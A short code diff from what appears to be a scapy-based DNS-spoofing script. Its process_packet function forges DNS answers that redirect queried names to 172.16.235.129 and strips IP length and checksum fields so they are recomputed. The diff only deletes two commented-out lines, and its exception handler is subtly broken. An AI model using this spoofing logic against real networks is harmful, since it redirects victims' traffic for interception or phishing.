@@ -15,7 +15,6 @@ def process_packet(packet):
                 answer = scapy.DNSRR(rrname=qname, rdata='172.16.235.129')
                 scapy_packet[scapy.DNS].an = answer
                 scapy_packet[scapy.DNS].ancount = 1
-                # print('scapy_packet: ' + scapy_packet.show())
 
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
@@ -26,7 +25,6 @@ def process_packet(packet):
             except:
                 print('[-] ' + IndexError)
 
-    # packet.drop()
     packet.accept()
 
 
